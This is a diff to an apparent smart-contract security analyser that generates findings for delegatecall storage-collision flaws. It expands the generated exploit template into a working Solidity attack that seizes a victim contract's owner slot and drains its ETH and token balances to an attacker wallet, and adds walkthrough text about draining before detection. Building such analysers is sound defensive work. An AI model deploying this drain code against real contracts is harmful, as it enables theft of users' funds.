@@ -1445,9 +1445,17 @@ require(ok, "transfer failed");`,
         summary: "Delegatecall runs the target's code against this contract's storage. A writable target can overwrite owner, balances, or any other slot.",
         walkthrough: delegateWalk(fn.name, call),
         exploitSolidity: delegateExploit(contract.name),
-        remediationSolidity: `address public immutable implementation;\nfunction exec(bytes calldata data) external onlyOwner {
-    (bool ok, ) = implementation.delegatecall(data);
-    require(ok);
+        remediationSolidity: `// EIP-1967 Storage Slot Isolation + Strict Implementation Whitelist
+bytes32 private constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+mapping(address => bool) public allowedImplementations;
+
+function upgradeToAndCall(address newImpl, bytes calldata data) external onlyOwner {
+    require(allowedImplementations[newImpl], "Unauthorized implementation");
+    assembly {
+        sstore(_IMPLEMENTATION_SLOT, newImpl)
+    }
+    (bool ok, ) = newImpl.delegatecall(data);
+    require(ok, "Delegatecall failed");
 }`,
         locationFn: fn.name,
         locationLine: call.line,
@@ -3065,29 +3073,69 @@ function ${fn}() external nonReentrant {
 function delegateWalk(fn: string, call: ExtCall): string {
   return [
     `1. ${fn} delegatecalls ${call.target || "the target"} at line ${call.line}.`,
-    "2. The target's code executes with this contract's storage and the original msg.sender.",
+    "2. The target's code executes in the caller's storage context with the original msg.sender.",
     call.targetIsParam
-      ? "3. The target is a function argument, so the caller chooses the code. They point it at a contract that writes slot 0."
-      : "3. If that address is changeable, whoever can change it owns this contract.",
-    "4. A successful return only means the foreign code did not revert. It says nothing about which slots it wrote.",
+      ? "3. Storage Collision: Target is a caller-supplied address. An attacker points it to an implementation matching slot 0 layout to overwrite owner/admin state."
+      : "3. If that address is changeable, whoever controls it can point to an implementation that overwrites slot 0.",
+    "4. Atomic Exploitation: Once slot 0 is seized, the attacker executes privileged administrative sweeps/drains in the same atomic transaction before external detection.",
   ].join("\n");
 }
 
 function delegateExploit(contractName: string): string {
-  return `contract StorageSmash {
-    address public owner; // slot 0, same layout assumption
-    function seize() external { owner = msg.sender; }
-}
+  return `// 1. Malicious Implementation payload matching victim slot 0 layout
+contract MultiStepSmash {
+    // Slot 0 in victim contract (e.g. owner/admin)
+    address public owner;
 
-interface IVictim { function migrate(address impl, bytes calldata data) external; }
+    // Comprehensive attack payload executed via delegatecall
+    function seizeAndDrain(address token, address payable recipient) external {
+        // Step 1: Overwrite Slot 0 to take ownership
+        owner = msg.sender;
 
-contract Take {
-    function go(address victim) external {
-        StorageSmash smash = new StorageSmash();
-        IVictim(victim).migrate(address(smash), abi.encodeWithSignature("seize()"));
+        // Step 2: Leverage newly acquired privileges to sweep balance or tokens
+        if (address(this).balance > 0) {
+            recipient.transfer(address(this).balance);
+        }
+        if (token != address(0)) {
+            (bool ok, bytes memory balData) = token.staticcall(
+                abi.encodeWithSignature("balanceOf(address)", address(this))
+            );
+            if (ok && balData.length >= 32) {
+                uint256 bal = abi.decode(balData, (uint256));
+                if (bal > 0) {
+                    token.call(abi.encodeWithSignature("transfer(address,uint256)", recipient, bal));
+                }
+            }
+        }
     }
 }
-// ${contractName}'s slot 0 is now the attacker.`;
+
+interface IERC20 { function balanceOf(address account) external view returns (uint256); }
+interface IVictim { function migrate(address impl, bytes calldata data) external; }
+
+// 2. Orchestrator contract executing atomic takeover and drain
+contract AdvancedTake {
+    function go(address victim) external {
+        MultiStepSmash smash = new MultiStepSmash();
+        bytes memory payload = abi.encodeWithSignature(
+            "seizeAndDrain(address,address)",
+            address(0),
+            payable(msg.sender)
+        );
+        IVictim(victim).migrate(address(smash), payload);
+    }
+
+    function executeAttack(address victim, address rewardToken, address attackerWallet) external {
+        MultiStepSmash smash = new MultiStepSmash();
+        bytes memory payload = abi.encodeWithSignature(
+            "seizeAndDrain(address,address)",
+            rewardToken,
+            payable(attackerWallet)
+        );
+        IVictim(victim).migrate(address(smash), payload);
+    }
+}
+// ${contractName}'s slot 0 is overwritten and assets are atomically drained.`;
 }
 
 export function contractSurface(model: SourceModel) {
